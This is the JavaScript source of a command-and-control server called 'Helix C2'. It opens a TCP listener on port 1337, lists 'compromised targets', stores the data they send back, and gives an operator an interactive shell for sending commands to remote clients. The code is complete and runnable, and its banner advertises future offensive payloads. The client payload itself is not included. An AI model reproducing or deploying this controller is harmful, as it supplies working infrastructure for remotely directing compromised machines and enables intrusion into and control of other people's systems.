const { clear } = require('console');
const net = require('net');
const readline = require('readline');

let clients = {};
let clientIdCounter = 0;
let server = null;

const header = `
    
    _    _      _ _          _____ ___  
   | |  | |    | (_)        / ____|__ \\ 
   | |__| | ___| |___  __  | |       ) |
   |  __  |/ _ \\ | \\ \\/ /  | |      / / 
   | |  | |  __/ | |>  <   | |____ / /_ 
   |_|  |_|\\___|_|_/_/\\_\\   \\_____|____|

   - C2 server currently suitable only for blue teamers and network admins
   - Author: https://github.com/tr3sp4ss3rexe
   
   [!] The only available payload for now is Windows GUI client
   [!] More payloads suitable for red teamers and offensive security will be added soon
   [!] Please use responsibly mon amour!
   _______________________________________________________________
`;

function printHeader() {
    console.clear();
    console.log(header);
}

function setupListener(port = 1337) {
    server = net.createServer((socket) => {
        const clientId = clientIdCounter++;
        const clientAddress = socket.remoteAddress.replace('::ffff:', '');
        const connectionTime = new Date();

        clients[clientId] = {
            socket: socket,
            clientAddress: clientAddress,
            connectionTime: connectionTime,
            data: '',
        };

        console.log(`Client ${clientId} connected from IP: ${clientAddress}`);

        
        socket.on('data', (data) => {
            const response = data.toString().trim();

            
            if (response.length > 0) {
                clients[clientId].data += response + '\n';

                
                if (clients[clientId].interactiveMode) {
                    process.stdout.write(`\nClient ${clientId} response: ${response}\n> `);
                }
            }
        });

        
        socket.on('end', () => {
            console.log(`Client ${clientId} disconnected.`);
            delete clients[clientId];
        });

        
        socket.on('error', (err) => {
            console.error(`Error with client ${clientId}: ${err.message}`);
        });
    });

    server.listen(port, () => {
        console.log(`TCP server is listening on port ${port}`);
    });
}


function displayMenu() {
    printHeader();
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log('\n1) Set up listener on port 1337 (default)\n2) List compromised targets\n3) Get target info\n4) Interact with a target\n5) Exit\n');

    rl.question('Enter your choice: ', (choice) => {
        switch (choice) {
            case '1':
                setupListener();
                waitForUserInput(rl);
                break;
            case '2':
                console.log('\nConnected Clients:');
                console.log(listClients() || 'No clients connected.');
                waitForUserInput(rl);
                break;
            case '3':
                rl.question('\nEnter client ID to get info: ', (clientId) => {
                    if (clients[clientId]) {
                        console.log(`\nClient ${clientId} connected from IP: ${clients[clientId].clientAddress}`);
                        console.log(`Connection time: ${clients[clientId].connectionTime.toLocaleString()}`);
                        console.log(`Data received so far from client ${clientId}: ${clients[clientId].data}`);
                    } else {
                        console.log('Invalid client ID. Please try again.');
                    }
                    waitForUserInput(rl);
                });
                break;
            case '4':
                rl.question('\nEnter client ID to interact with: ', (clientId) => {
                    if (clients[clientId]) {
                        console.log(`\nEntering interactive shell with client ${clientId}...`);
                        clients[clientId].interactiveMode = true;
                        rl.close();
                        displayInteractiveShell(clientId);
                    } else {
                        console.log('Invalid client ID. Please try again.');
                        waitForUserInput(rl);
                    }
                });
                break;
            case '5':
                console.log('Exiting...');
                rl.close();
                if (server) server.close();
                process.exit(0);
                break;
            default:
                console.log('Invalid choice. Please try again.');
                waitForUserInput(rl);  
                break;
        }
    });
}


function waitForUserInput(rl) {
    rl.question('\nPress enter to continue...', () => {
        rl.close();
        displayMenu();
    });
}


function listClients() {
    return Object.keys(clients).length > 0 ?
        Object.keys(clients).map(clientId => `Client ${clientId} (${clients[clientId].clientAddress})`).join('\n') :
        'No clients connected';
}


function displayInteractiveShell(clientId) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
        prompt: '> '
    });

    rl.prompt();

    rl.on('line', (command) => {
        if (command.toLowerCase() === 'exit') {
            clients[clientId].interactiveMode = false;
            console.log(`Exiting interaction with client ${clientId}...`);
            rl.close();
            displayMenu();
        } else if (clients[clientId]) {
            clients[clientId].socket.write(command + '\n');
            console.log(`Command sent to client ${clientId}`);
            rl.prompt();
        } else {
            console.log(`Client ${clientId} is no longer connected.`);
            rl.close();
            displayMenu();
        }
    });

    rl.on('close', () => {
        clients[clientId].interactiveMode = false;
        displayMenu();
    });
}

displayMenu();
